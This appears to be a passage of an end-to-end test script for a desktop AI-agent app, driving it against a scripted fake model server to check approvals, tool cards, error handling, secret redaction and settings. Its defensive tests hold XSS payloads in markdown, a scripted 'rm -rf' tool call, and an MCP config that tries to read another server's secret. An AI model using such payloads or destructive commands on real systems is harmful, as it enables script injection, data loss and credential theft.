#!/usr/bin/env python3
"""Scripted-model end-to-end checks: the real app against a fake OpenAI-compatible
endpoint whose replies (text, thinking, tool calls, errors, dropped streams) are scripted,
so the agent loop, approvals, tool cards, error handling and settings are checked
deterministically, without a model.

Each check records PASS or FAIL and the run goes on; the exit code is 1 if any failed.
`PROBES=name,name` runs only those checks.

    python3 -I e2e/scripted_agent.py
"""

import json
import os
import pathlib
import shutil
import socket
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import traceback
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "e2e"))
from webdriver import Session, WebDriverError  # noqa: E402

APP = os.environ.get("APP_BIN", str(ROOT / "target" / "debug" / "app"))
LLAMA_DIR = os.environ.get("APP_DEV_LLAMA_DIR", str(ROOT / ".cache" / "llama-linux"))
OUT = pathlib.Path(os.environ.get("E2E_OUT", tempfile.mkdtemp(prefix="e2e-scripted-")))
IDENTIFIER = "io.github.sugarhappy8.harnessui"
ONLY = set(filter(None, os.environ.get("PROBES", "").split(",")))

RESULTS = []


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class Fake(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    queue = []  # scripted replies, oldest first
    requests = []
    report_ctx = None
    lock = threading.Lock()

    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path.rstrip("/") == "/v1/models":
            body = json.dumps({"object": "list", "data": [{"id": "fake-model", "object": "model"}]}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_error(404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        req = json.loads(self.rfile.read(length) or b"{}")
        with Fake.lock:
            Fake.requests.append(req)
            item = Fake.queue.pop(0) if Fake.queue else {"content": "ok"}
        if "status" in item:
            body = json.dumps({"error": {"message": item.get("message", "scripted failure")}}).encode()
            self.send_response(item["status"])
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Transfer-Encoding", "chunked")
        self.send_header("Connection", "close")
        self.end_headers()
        self.close_connection = True

        def raw(data: bytes):
            self.wfile.write(f"{len(data):x}\r\n".encode() + data + b"\r\n")
            self.wfile.flush()

        def emit(obj):
            raw(f"data: {json.dumps(obj)}\n\n".encode())

        try:
            if "tool_calls" in item:
                for i, tc in enumerate(item["tool_calls"]):
                    emit({"choices": [{"index": 0, "delta": {"tool_calls": [{
                        "index": i, "id": f"call_{len(Fake.requests)}_{i}", "type": "function",
                        "function": {"name": tc["name"], "arguments": json.dumps(tc["arguments"])}}]}}]})
                emit({"choices": [{"index": 0, "delta": {}, "finish_reason": "tool_calls"}],
                      "usage": {"prompt_tokens": item.get("prompt_tokens", 50), "completion_tokens": 10}})
            else:
                rtext = item.get("reasoning", "")
                for i in range(0, len(rtext), 12):
                    emit({"choices": [{"index": 0, "delta": {"reasoning_content": rtext[i:i + 12]}}]})
                    time.sleep(0.01)
                text = item["content"]
                n = item.get("chunk", 16)
                for i in range(0, len(text), n):
                    emit({"choices": [{"index": 0, "delta": {"content": text[i:i + n]}}]})
                    time.sleep(item.get("delay", 0.01))
                    if item.get("drop_after") is not None and i >= item["drop_after"]:
                        self.connection.shutdown(socket.SHUT_RDWR)
                        return
                if item.get("no_finish"):
                    self.wfile.write(b"0\r\n\r\n")
                    return
                emit({"choices": [{"index": 0, "delta": {}, "finish_reason": "stop"}],
                      "usage": {"prompt_tokens": item.get("prompt_tokens", 50), "completion_tokens": 10}})
            raw(b"data: [DONE]\n\n")
            self.wfile.write(b"0\r\n\r\n")
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass


HOOK = """
if (!window.__probe) {
  window.__probe = [];
  const push = (kind, msg) => window.__probe.push(kind + ': ' + String(msg).slice(0, 400));
  const ce = console.error.bind(console);
  console.error = (...a) => { push('console.error', a.map(x => (x && x.stack) || (typeof x === 'object' ? JSON.stringify(x) : x)).join(' ')); ce(...a); };
  const cw = console.warn.bind(console);
  console.warn = (...a) => { push('console.warn', a.join(' ')); cw(...a); };
  window.addEventListener('error', e => push('error', e.message + ' @' + e.filename + ':' + e.lineno));
  window.addEventListener('unhandledrejection', e => push('unhandledrejection', (e.reason && (e.reason.stack || JSON.stringify(e.reason))) || e.reason));
  document.addEventListener('securitypolicyviolation', e => push('csp', e.violatedDirective + ' ' + e.blockedURI + ' ' + (e.sample || '')));
}
return true;
"""


class Ctx:
    pass


def probe(name):
    def deco(fn):
        fn.probe_name = name
        return fn
    return deco


def run(fn, c):
    if ONLY and fn.probe_name not in ONLY:
        return
    print(f"--- {fn.probe_name}", flush=True)
    c.s.execute(HOOK)
    c.s.execute("window.__probe.length = 0; return true;")
    Fake.queue.clear()
    notes = []
    try:
        fn(c, notes)
        status = "PASS"
    except Exception as e:  # noqa: BLE001
        status = "FAIL"
        notes.append("".join(traceback.format_exception_only(type(e), e)).strip()[:1500])
        if os.environ.get("E2E_TRACE"):
            # Where in the scenario it happened.
            notes.append("trace: " + " <- ".join(
                f"{f.name}:{f.lineno}" for f in reversed(traceback.extract_tb(e.__traceback__)[-4:])))
        try:
            c.s.screenshot(str(OUT / f"fail-{fn.probe_name}.png"))
            notes.append("page: " + c.s.page_text()[-600:].replace("\n", " | "))
        except Exception:  # noqa: BLE001
            pass
    try:
        console = c.s.execute("return window.__probe ? window.__probe.slice() : ['<hook lost>'];")
    except Exception as e:  # noqa: BLE001
        console = [f"<could not read console: {e}>"]
    RESULTS.append((fn.probe_name, status, notes, console))
    print(f"    {status}", flush=True)
    for n in notes:
        print("    note:", n, flush=True)
    for line in console:
        print("    console:", line, flush=True)
    # Leave dialogs and popovers closed for the next probe.
    try:
        for _ in range(3):
            c.s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
            time.sleep(0.15)
    except Exception:  # noqa: BLE001
        pass


def idle(s):
    return s.execute("return document.querySelector('button[aria-label=\"Stop\"]') === null;")


def send(s, text):
    box = s.find("textarea")
    s.type(box, text)
    s.type(box, "")


def new_chat(c, tools=None):
    s = c.s
    chat = s.invoke("create_chat", {"modelRef": c.model_ref})
    s.invoke("set_chat_tools", {"chatId": chat["id"], "enabled": c.default_tools if tools is None else tools})
    s.execute("window.location.reload();")
    time.sleep(1.5)
    s.wait_for(lambda: "New chat" in s.page_text(), 20, "sidebar after reload")
    s.execute(HOOK)
    # Open the newest chat (first in the list).
    s.execute(
        """
        const a = [...document.querySelectorAll('nav[aria-label="Chat history"] button')].find(b => b.innerText.includes('New chat'));
        a && a.click();
        """
    )
    time.sleep(0.6)
    return chat["id"]


def choose_mode(s, current, label):
    """The chat header's approval menu (0.0.5): opens it from the button that shows the
    current mode, then picks a mode by its name."""
    s.click_button(current)
    el = s.wait_for(lambda: s.execute(
        """
        const l = arguments[0];
        return [...document.querySelectorAll('[role=menuitemradio]')]
          .find(e => (e.innerText || '').trim().startsWith(l)) || null;
        """, label) or False, 10, f"the menu item {label!r}")
    s.click(next(iter(el.values())))
    time.sleep(0.4)


def settings_radio(s, label):
    """A choice in Settings: the radio (in the open dialog) whose text starts with `label`."""
    el = s.wait_for(lambda: s.execute(
        """
        const l = arguments[0];
        const d = document.querySelector('[role=dialog][data-state=open]') || document;
        return [...d.querySelectorAll('[role=radio]')]
          .find(e => (e.innerText || '').trim().startsWith(l)) || null;
        """, label) or False, 10, f"the choice {label!r}")
    s.click(next(iter(el.values())))
    time.sleep(0.4)


def messages(s, chat_id):
    return s.invoke("get_chat", {"chatId": chat_id})["messages"]


def wait_idle(s, n=60):
    time.sleep(0.4)
    s.wait_for(lambda: idle(s), n, "turn finished")


def answer_card(s, label, timeout=30):
    s.wait_for(lambda: "Allow once" in s.page_text(), timeout, "approval card")
    time.sleep(0.9)
    s.click_button(label)


# ---------------------------------------------------------------------------------------


@probe("markdown")
def p_markdown(c, notes):
    s = c.s
    chat = new_chat(c, tools=[])
    text = (
        "Entities: A &amp; B &lt;tag&gt; &copy; &notit; &#x41; &nbsp;end.\n\n"
        "```python\ndef f(x):\n    return x + 1  # comment\n```\n\n"
        "```nosuchlang\nplain <b>text</b>\n```\n\n"
        "```\nno language here\n```\n\n"
        "Inline `code` and **bold** and a [link](https://example.com/x) and [bad](javascript:alert(1)).\n\n"
        "<img src=\"https://example.com/pixel.png\" onerror=\"window.__pwned=1\">\n\n"
        "<script>window.__pwned=2</script>\n\n"
        "![remote](https://example.com/remote.png)\n\n"
        "| a | b |\n|---|---|\n| 1 | 2 |\n\n"
        "- [ ] task\n- [x] done\n\n"
        "<details><summary>s</summary>hidden</details>\n"
    )
    Fake.queue.append({"content": text, "chunk": 7})
    send(s, "render this")
    wait_idle(s)
    s.screenshot(str(OUT / "markdown.png"))
    info = s.execute(
        """
        const root = document.querySelector('main') || document.body;
        return {
          text: root.innerText,
          hljs: root.querySelectorAll('pre code [class^="hljs-"], pre code [class*=" hljs-"]').length,
          pre: root.querySelectorAll('pre').length,
          imgs: [...root.querySelectorAll('img')].map(i => i.getAttribute('src')),
          scripts: root.querySelectorAll('script').length,
          links: [...root.querySelectorAll('a')].map(a => a.getAttribute('href')),
          tables: root.querySelectorAll('table').length,
          details: root.querySelectorAll('details').length,
          pwned: window.__pwned || null,
          checkboxes: root.querySelectorAll('input[type=checkbox]').length,
        };
        """
    )
    notes.append(json.dumps({k: v for k, v in info.items() if k != "text"}))
    t = info["text"]
    assert "A & B <tag> ©" in t, t[-500:]
    assert "&amp;" not in t, "entity left undecoded"
    assert info["hljs"] > 0, "no highlighted tokens"
    assert info["pre"] == 3, info["pre"]
    assert info["pwned"] is None, "script ran"
    assert info["scripts"] == 0
    assert not any(src and src.startswith("http") for src in info["imgs"]), info["imgs"]
    assert not any(h and h.lower().startswith("javascript:") for h in info["links"]), info["links"]
    assert info["tables"] == 1
    assert "plain <b>text</b>" in t


@probe("settings-pages")
def p_settings(c, notes):
    s = c.s
    s.click_button("Settings")
    tabs = ["General", "Local models", "Endpoints", "Hugging Face", "MCP servers", "Skills", "Git", "Browser",
            "Computer use", "Permissions", "Audit log", "Diagnostics"]
    for tab in tabs:
        s.click_button(tab)
        time.sleep(0.7)
        text = s.page_text()
        alerts = s.execute("return [...document.querySelectorAll('[role=alert]')].map(e => e.innerText.slice(0, 200));")
        if alerts:
            notes.append(f"{tab}: alerts {alerts}")
        assert "Something went wrong" not in text, tab
    s.screenshot(str(OUT / "settings-diagnostics.png"))
    assert not any("alerts" in n for n in notes), notes


@probe("general-settings")
def p_general(c, notes):
    s = c.s
    st = s.invoke("update_status")
    notes.append("update_status " + json.dumps(st))
    assert st["available"] is None and st["configured"] is False
    hk = s.invoke("stop_hotkey_status")
    notes.append("hotkey " + json.dumps(hk))
    bar = "stop hotkey could not be registered" in s.page_text()
    assert bar == (bool(hk["accelerator"]) and not hk["registered"]), f"warning bar {bar} vs status {hk}"
    info = s.invoke("first_run_info")
    notes.append(f"catalog seq {info.get('catalogSequence')} disabled: {info.get('refreshDisabledReason')}")
    s.click_button("Settings")
    s.click_button("General")
    time.sleep(0.5)
    text = s.page_text()
    assert "Model catalog" in text and "Default system prompt" in text, text[-400:]
    assert "Catalog version" in text
    btn = s.execute("return [...document.querySelectorAll('button')].find(b => b.innerText.includes('Refresh catalog')).disabled;")
    assert btn is True, "refresh should be disabled without a key"
    # Default system prompt through the UI.
    s.execute(
        """
        const el = document.querySelector('section[aria-label="Default system prompt"] textarea');
        Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(el, arguments[0]);
        el.dispatchEvent(new Event('input', {bubbles: true}));
        """,
        "PROBE-SYSTEM-PROMPT-77",
    )
    sec = "section[aria-label=\"Default system prompt\"]"
    s.execute(f"[...document.querySelectorAll('{sec} button')].find(b => /save/i.test(b.innerText)).click();")
    time.sleep(0.6)
    assert s.invoke("get_setting", {"key": "defaultSystemPrompt"}) == "PROBE-SYSTEM-PROMPT-77"
    s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
    chat = new_chat(c, tools=[])
    Fake.requests.clear()
    send(s, "hi")
    wait_idle(s)
    sysmsg = Fake.requests[-1]["messages"][0]
    assert sysmsg["role"] == "system" and "PROBE-SYSTEM-PROMPT-77" in sysmsg["content"], sysmsg
    s.invoke("set_setting", {"key": "defaultSystemPrompt", "value": None})
    send(s, "again")
    wait_idle(s)
    sysmsg = Fake.requests[-1]["messages"][0]["content"]
    assert "PROBE-SYSTEM-PROMPT-77" not in sysmsg and "helpful assistant" in sysmsg, sysmsg[:200]
    del chat


@probe("remote-context")
def p_remote_ctx(c, notes):
    s = c.s
    for bad in [12, "abc", 99999999, -5, 4096.5]:
        try:
            s.invoke("set_setting", {"key": "remoteContextLength", "value": bad})
            notes.append(f"accepted bad value {bad!r}")
        except WebDriverError:
            pass
    s.invoke("set_setting", {"key": "remoteContextLength", "value": 4096})
    chat = new_chat(c, tools=c.all_tools)
    send(s, "hi")
    wait_idle(s)
    t1 = s.page_text()
    notes.append("4096 with every tool: " + t1[-330:].replace("\n", " | "))
    last = messages(s, chat)[-1]
    notes.append(f"last: role={last['role']} status={last.get('status')} error={json.dumps(last.get('error'))[:300]}")
    s.invoke("set_setting", {"key": "remoteContextLength", "value": 16384})
    send(s, "hi again")
    wait_idle(s)
    t2 = s.page_text()
    import re
    ctx1 = re.findall(r"[\d,.]+\s*(?:/|of)\s*([\d,.]+k?)", t1)
    ctx2 = re.findall(r"[\d,.]+\s*(?:/|of)\s*([\d,.]+k?)", t2)
    notes.append(f"context shown: default {ctx1[:3]} then {ctx2[:3]}")
    s.invoke("set_setting", {"key": "remoteContextLength", "value": 32768})
    assert not any("accepted bad" in n for n in notes), notes
    del chat


@probe("folders")
def p_folders(c, notes):
    s = c.s
    chat = new_chat(c)
    work, other = str(c.work), str(c.other)
    folders = s.invoke("list_approved_folders", {"chatId": chat})
    assert [f["path"] for f in folders] == [work], folders
    try:
        s.invoke("set_chat_working_folder", {"chatId": chat, "path": other})
        raise AssertionError("an unapproved working folder was accepted")
    except WebDriverError as e:
        assert "approved" in str(e), e
    s.invoke("set_chat_working_folder", {"chatId": chat, "path": work})
    assert s.invoke("get_chat", {"chatId": chat})["chat"]["workingFolder"] == work
    # Per-chat folder in the database (the picker is native), then the panel.
    con = sqlite3.connect(c.db)
    con.execute("INSERT INTO approved_folders(path, chat_id, created_at) VALUES (?, ?, ?)", (other, chat, int(time.time() * 1000)))
    con.commit()
    con.close()
    s.click_button("Tools")
    s.wait_text("Folders for this chat", 10)
    time.sleep(0.5)
    s.screenshot(str(OUT / "tools-panel-folders.png"))
    panel = s.page_text()
    assert work in panel and other in panel, panel[-600:]
    radios = s.execute("return [...document.querySelectorAll('input[type=radio]')].map(r => ({v: r.value, c: r.checked, l: r.getAttribute('aria-label') || r.closest('label')?.innerText}));")
    notes.append("radios " + json.dumps(radios))
    assert any(r["c"] for r in radios), "no working folder selected in the panel"
    # Choose the other folder as working folder through the UI.
    s.execute(
        """
        const r = [...document.querySelectorAll('input[type=radio]')].find(r => !r.checked);
        r.click();
        """
    )
    time.sleep(0.6)
    assert s.invoke("get_chat", {"chatId": chat})["chat"]["workingFolder"] == other
    # A relative path now resolves in the working folder.
    Fake.queue.append({"tool_calls": [{"name": "list_dir", "arguments": {"path": "."}}]})
    Fake.queue.append({"content": "listed"})
    s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
    time.sleep(0.3)
    send(s, "list")
    s.wait_for(lambda: "Allow once" in s.page_text() or idle(s), 30, "card or done")
    card = s.page_text()
    if "Allow once" in card:
        assert other in card, card[-500:]
        time.sleep(0.9)
        s.click_button("Allow once")
    wait_idle(s)
    last_tool = [m for m in messages(s, chat) if m["role"] == "tool"][-1]
    notes.append("list_dir result: " + json.dumps(last_tool)[:300])
    assert "only-in-other.txt" in json.dumps(last_tool), "relative path did not use the chosen working folder"
    # Removing the chat's folder makes the stored working folder stale: the first approved one is used.
    fid = [f for f in s.invoke("list_approved_folders", {"chatId": chat}) if f["path"] == other][0]["id"]
    s.invoke("remove_approved_folder", {"id": fid})
    Fake.queue.append({"tool_calls": [{"name": "list_dir", "arguments": {"path": "."}}]})
    Fake.queue.append({"content": "listed again"})
    send(s, "list again")
    s.wait_for(lambda: "Allow once" in s.page_text() or idle(s), 30, "card or done")
    if "Allow once" in s.page_text():
        time.sleep(0.9)
        s.click_button("Allow once")
    wait_idle(s)
    last_tool = json.dumps([m for m in messages(s, chat) if m["role"] == "tool"][-1])
    assert "notes.txt" in last_tool and "only-in-other" not in last_tool, last_tool[:400]


@probe("skills-unload")
def p_skills(c, notes):
    s = c.s
    skill = "---\nname: probe-skill\ndescription: Probe skill. Use when asked about the probe.\n---\n\nPROBE-SKILL-BODY-991\n"
    problems = s.invoke("save_skill", {"folder": "probe-skill", "text": skill, "isNew": True})
    assert not problems, problems
    chat = new_chat(c)
    Fake.queue.append({"tool_calls": [{"name": "load_skill", "arguments": {"name": "probe-skill"}}]})
    Fake.queue.append({"content": "loaded it"})
    Fake.requests.clear()
    send(s, "load the probe skill")
    wait_idle(s)
    assert "Allow once" not in s.page_text(), "skill load asked for approval (D11)"
    assert s.invoke("loaded_skills", {"chatId": chat}) == ["probe-skill"]
    index = Fake.requests[0]["messages"][0]["content"]
    assert "probe-skill" in index and "PROBE-SKILL-BODY-991" not in index
    Fake.requests.clear()
    send(s, "next")
    wait_idle(s)
    assert "PROBE-SKILL-BODY-991" in Fake.requests[-1]["messages"][0]["content"], "loaded skill text is not in the system message"
    s.click_button("Tools")
    s.wait_text("Skills loaded in this chat", 10)
    s.screenshot(str(OUT / "tools-panel-skills.png"))
    s.click_button("Unload probe-skill")
    time.sleep(0.6)
    assert s.invoke("loaded_skills", {"chatId": chat}) == []
    s.execute("document.dispatchEvent(new KeyboardEvent('keydown', {key: 'Escape', bubbles: true}));")
    time.sleep(0.3)
    Fake.requests.clear()
    send(s, "after unload")
    wait_idle(s)
    assert "PROBE-SKILL-BODY-991" not in Fake.requests[-1]["messages"][0]["content"], "unloaded skill still in the system message"
    audit = s.invoke("list_audit", {"filter": {"chatId": chat}})
    notes.append("audit decisions: " + json.dumps([(a["tool"], a["decision"]) for a in audit]))
    s.invoke("delete_skill", {"name": "probe-skill"})


@probe("skill-folder-guard")
def p_skill_guard(c, notes):
    s = c.s
    chat = new_chat(c)
    target = str(c.skills_root / "evil" / "SKILL.md")
    Fake.queue.append({"tool_calls": [{"name": "write_file", "arguments": {"path": target, "content": "---\nname: evil\ndescription: x\n---\nhi"}}]})
    Fake.queue.append({"content": "done"})
    send(s, "write a skill")
    time.sleep(1.0)
    s.wait_for(lambda: "Allow once" in s.page_text() or idle(s), 30, "card or done")
    if "Allow once" in s.page_text():
        notes.append("a card was shown for a write into the skills folder")
        time.sleep(0.9)
        s.click_button("Allow once")
    wait_idle(s)
    assert not (c.skills_root / "evil").exists(), "a skill was written by the file tool"
    tool = json.dumps([m for m in messages(s, chat) if m["role"] == "tool"][-1])
    notes.append("result: " + tool[:300])


@probe("terminal-git")
def p_terminal_git(c, notes):
    s = c.s
    chat = new_chat(c, tools=c.all_tools)
    repo = c.work / "repo"
    if not repo.exists():
        repo.mkdir()
        env = dict(os.environ, GIT_CONFIG_GLOBAL="/dev/null", GIT_AUTHOR_NAME="p", GIT_AUTHOR_EMAIL="p@p", GIT_COMMITTER_NAME="p", GIT_COMMITTER_EMAIL="p@p")
        for cmd in [["git", "init", "-q", "-b", "main"], ["git", "commit", "-q", "--allow-empty", "-m", "init"],
                    ["git", "remote", "add", "origin", "https://user:SECRETTOKEN123@example.invalid/r.git"]]:
            subprocess.run(cmd, cwd=repo, check=True, env=env)
    # Terminal: a plain command with a card.
    Fake.queue.append({"tool_calls": [{"name": "run_command", "arguments": {"command": "echo probe-$((40+2))", "cwd": str(c.work)}}]})
    Fake.queue.append({"content": "ran"})
    send(s, "run it")
    answer_card(s, "Allow once")
    wait_idle(s)
    out = json.dumps([m for m in messages(s, chat) if m["role"] == "tool"][-1])
    assert "probe-42" in out, out[:400]
    # A call that does not run says why on its card.
    Fake.queue.append({"tool_calls": [{"name": "git_push", "arguments": {"path": str(repo)}}]})
    Fake.queue.append({"content": "hm"})
    # The message names git: only tools that fit the task are shown to the model (0.0.4).
    send(s, "git push, with a bad argument")
    wait_idle(s)
    bad = [m for m in messages(s, chat) if m["role"] == "tool"][-1]["toolResult"]
    assert bad["status"] == "error" and "Invalid arguments" in bad["text"], bad
    s.execute("[...document.querySelectorAll('button[aria-expanded]')].filter(b => b.innerText.includes('git_push')).pop().click();")
    time.sleep(0.4)
    assert "Invalid arguments for git_push" in s.page_text(), "the card does not show why the call failed"
    s.screenshot(str(OUT / "failed-card.png"))
    # A destructive command always asks and offers no chat-wide grant.
    Fake.queue.append({"tool_calls": [{"name": "run_command", "arguments": {"command": "rm -rf ./nothing-here", "cwd": str(c.work)}}]})
    Fake.queue.append({"content": "ok"})
    send(s, "delete")
    s.wait_for(lambda: "Allow once" in s.page_text(), 30, "card")
    card = s.page_text()
    assert "Allow for this chat" not in card, "a delete offered a chat-wide grant"
    time.sleep(0.9)
    s.click_button("Deny")
    wait_idle(s)
    # git push: the card and everything stored must not show the token.
    Fake.queue.append({"tool_calls": [{"name": "git_push", "arguments": {"repo": str(repo)}}]})
    Fake.queue.append({"content": "pushed?"})
    Fake.requests.clear()
    send(s, "push")
    try:
        s.wait_for(lambda: "Allow once" in s.page_text(), 15, "push card")
    except WebDriverError:
        notes.append("NO CARD; result: " + json.dumps([m for m in messages(s, chat) if m["role"] == "tool"][-1]["toolResult"])[:900])
        raise
    card = s.page_text()
    s.screenshot(str(OUT / "push-card.png"))
    assert "SECRETTOKEN123" not in card, "token on the push card"
    assert "example.invalid" in card, card[-400:]
    assert "Allow for this chat" not in card
    time.sleep(0.9)
    s.click_button("Allow once")
    wait_idle(s, 90)
    dump = json.dumps(messages(s, chat)) + json.dumps(s.invoke("list_audit", {"filter": {"chatId": chat}})) + json.dumps(Fake.requests)
    assert "SECRETTOKEN123" not in dump, "token reached the chat, the audit log or the prompt"
    notes.append("push result: " + json.dumps([m for m in messages(s, chat) if m["role"] == "tool"][-1])[:300])


@probe("errors")
def p_errors(c, notes):
    s = c.s
    chat = new_chat(c, tools=[])
    for item, label in [({"status": 500, "message": "boom"}, "500"), ({"status": 400, "message": "tools are not supported"}, "400"),
                        ({"status": 401, "message": "bad key"}, "401"), ({"content": "partial reply that is cut " * 20, "drop_after": 64}, "dropped"),
                        ({"content": "ends cleanly but never says it finished " * 3, "no_finish": True}, "no-finish")]:
        Fake.queue.clear()
        Fake.queue.append(item)
        before = len(messages(s, chat))
        send(s, f"try {label}")
        wait_idle(s, 90)
        time.sleep(0.5)
        msgs = messages(s, chat)
        last = msgs[-1]
        notes.append(f"{label}: new={[(m['role'], m.get('status'), len(m.get('text') or '')) for m in msgs[before:]]}; error={json.dumps(last.get('error'))[:260]}")
        new = msgs[before:]
        assert [m["role"] for m in new] == ["user", "assistant"], f"{label}: {[(m['role'], m.get('status')) for m in new]}"
        if label in ("500", "400", "401", "dropped"):
            assert last.get("status") == "error", last
            step_text = last["error"]["nextStep"]
            assert "Settings → Endpoints" in step_text, step_text
            assert "model is still running" not in step_text, step_text
        if label == "401":
            assert "API key" in last["error"]["nextStep"], last["error"]
        if label == "dropped":
            assert "partial reply" in (last.get("text") or ""), "the text streamed before the drop was lost"
        if label == "no-finish":
            assert last.get("status") == "complete" and "cut short" in s.page_text(), s.page_text()[-300:]
    s.screenshot(str(OUT / "errors.png"))
    # The chat still works afterwards.
    Fake.queue.clear()
    Fake.queue.append({"content": "recovered fine"})
    send(s, "now work")
    wait_idle(s)
    assert "recovered fine" in s.page_text()


@probe("stop-and-regenerate")
def p_stop(c, notes):
    s = c.s
    chat = new_chat(c, tools=[])
    Fake.queue.append({"content": "slow " * 400, "chunk": 5, "delay": 0.05})
    send(s, "stream slowly")
    s.wait_for(lambda: not idle(s), 20, "streaming")
    time.sleep(1.0)
    s.click_button("Stop")
    wait_idle(s, 20)
    last = messages(s, chat)[-1]
    notes.append(f"after stop: status={last.get('status')}")
    assert last.get("status") == "stopped", last
    Fake.queue.append({"content": "second version"})
    s.click_button("Regenerate")
    wait_idle(s)
    assert "second version" in s.page_text()
    assert "2 / 2" in s.page_text().replace(" ", " "), "no version arrows after regenerate"


@probe("mcp-config")
def p_mcp(c, notes):
    s = c.s
    cfg = {"mcpServers": {"a b": {"command": "true", "env": {"K": "v1"}}, "a_b": {"command": "true", "env": {"K": "v2"}}}}
    try:
        s.invoke("add_mcp_servers", {"json": json.dumps(cfg), "names": ["a b", "a_b"], "moveCredentials": True})
        raise AssertionError("two servers that share secret names were added")
    except WebDriverError as e:
        assert "similar" in str(e), e
    assert not [x for x in s.invoke("list_mcp_servers") if x["name"] in ("a b", "a_b")], "a server was added before the refusal"
    stolen = {"mcpServers": {"thief": {"command": "true", "env": {"X": "${secret:other.env.TOKEN}"}}}}
    for cmd, args in [("preview_mcp_config", {"json": json.dumps(stolen)}),
                      ("add_mcp_servers", {"json": json.dumps(stolen), "names": ["thief"], "moveCredentials": True})]:
        try:
            s.invoke(cmd, args)
            raise AssertionError(f"{cmd} accepted a secret placeholder")
        except WebDriverError:
            pass
    # A real stdio server: python one-liner speaking MCP is too long; a server that exits at once
    # must end in a clear failed state, not hang.
    bad = {"mcpServers": {"exits": {"command": "false"}}}
    s.invoke("add_mcp_servers", {"json": json.dumps(bad), "names": ["exits"], "moveCredentials": True})
    time.sleep(4)
    row = [x for x in s.invoke("list_mcp_servers") if x["name"] == "exits"][0]
    notes.append("exits server: " + json.dumps(row)[:300])
    s.invoke("remove_mcp_server", {"name": "exits"})


@probe("regenerate-after-error")
def p_regen_error(c, notes):
    s = c.s
    chat = new_chat(c, tools=[])
    Fake.queue.append({"status": 500, "message": "boom"})
    send(s, "first")
    wait_idle(s)
    assert messages(s, chat)[-1]["status"] == "error"
    Fake.queue.append({"content": "worked the second time"})
    s.click_button("Regenerate")
    wait_idle(s)
    msgs = messages(s, chat)
    notes.append(str([(m["role"], m.get("status")) for m in msgs]))
    assert msgs[-1]["status"] == "complete" and "worked the second time" in s.page_text()
    assert [m["role"] for m in msgs] == ["user", "assistant"], msgs
    # Edit and resend the user message.
    Fake.queue.append({"content": "answer to the edited one"})
    Fake.requests.clear()
    s.click_button("Edit and resend")
    time.sleep(0.3)
    box = s.execute("return [...document.querySelectorAll('textarea')].find(t => t.value === 'first') || null;")
    assert box, "no edit box with the old text"
    bid = next(iter(box.values()))
    s.type(bid, " edited")
    s.click_button("Send")
    wait_idle(s)
    assert "answer to the edited one" in s.page_text(), s.page_text()[-300:]
    users = [m["content"] for m in Fake.requests[-1]["messages"] if m["role"] == "user"]
    notes.append("user messages sent: " + json.dumps(users)[:200])
    assert len(users) == 1 and "first edited" in json.dumps(users), users


@probe("switch-during-stream")
def p_switch(c, notes):
    s = c.s
    chat = new_chat(c, tools=[])
    Fake.queue.append({"content": "streamword " * 120, "chunk": 11, "delay": 0.04})
    send(s, "long one")
    s.wait_for(lambda: "streamword" in s.page_text(), 20, "streaming")
    s.click_button("New chat")
    time.sleep(0.8)
    t = s.page_text()
    notes.append("other chat while streaming shows stream text: " + str("streamword streamword" in t))
    assert "streamword streamword" not in t, "another chat shows the first chat's stream"
    # The composer in the other chat while a turn runs elsewhere.
    notes.append("stop button visible in other chat: " + str(not idle(s)))
    time.sleep(6)
    # Back to the first chat.
    s.execute(
        """
        const a = [...document.querySelectorAll('nav[aria-label="Chat history"] button')].find(b => b.innerText.includes('long one'));
        a && a.click();
        """
    )
    time.sleep(1.0)
    wait_idle(s, 30)
    last = messages(s, chat)[-1]
    assert last["status"] == "complete" and last["text"].count("streamword") == 120, (last["status"], last["text"].count("streamword"))
    assert s.page_text().count("streamword") >= 120, "the finished reply is not shown after coming back"


@probe("delete-during-stream")
def p_delete(c, notes):
    s = c.s
    chat = new_chat(c, tools=[])
    Fake.queue.append({"content": "doomed " * 200, "chunk": 7, "delay": 0.04})
    send(s, "to be deleted")
    s.wait_for(lambda: "doomed" in s.page_text(), 20, "streaming")
    s.invoke("delete_chat", {"chatId": chat})
    time.sleep(2.5)
    ids = [x["id"] for x in s.invoke("list_chats", {"query": None})]
    assert chat not in ids
    # The app is still usable.
    chat2 = new_chat(c, tools=[])
    Fake.queue.clear()
    Fake.queue.append({"content": "alive after delete"})
    send(s, "hello")
    wait_idle(s, 40)
    assert "alive after delete" in s.page_text(), s.page_text()[-300:]
    del chat2


@probe("reasoning")
def p_reasoning(c, notes):
    s = c.s
    chat = new_chat(c, tools=[])
    Fake.queue.append({"reasoning": "Let me think about this carefully. " * 3, "content": "The answer is 7."})
    send(s, "think")
    wait_idle(s)
    last = messages(s, chat)[-1]
    notes.append("keys: " + ",".join(sorted(last.keys())))
    assert last["text"] == "The answer is 7.", last["text"]
    assert "think about this carefully" in json.dumps(last), "the thinking was not stored"
    assert "The answer is 7." in s.page_text()
    # Thinking is not sent back to the server on the next request.
    Fake.requests.clear()
    Fake.queue.append({"content": "ok"})
    send(s, "next")
    wait_idle(s)
    assert "think about this carefully" not in json.dumps(Fake.requests[-1]), "old thinking was sent back to a remote server"


@probe("text-tool-call-and-grants")
def p_text_call(c, notes):
    s = c.s
    chat = new_chat(c)
    path = str(c.work / "notes.txt")
    # A native call, allowed for the chat.
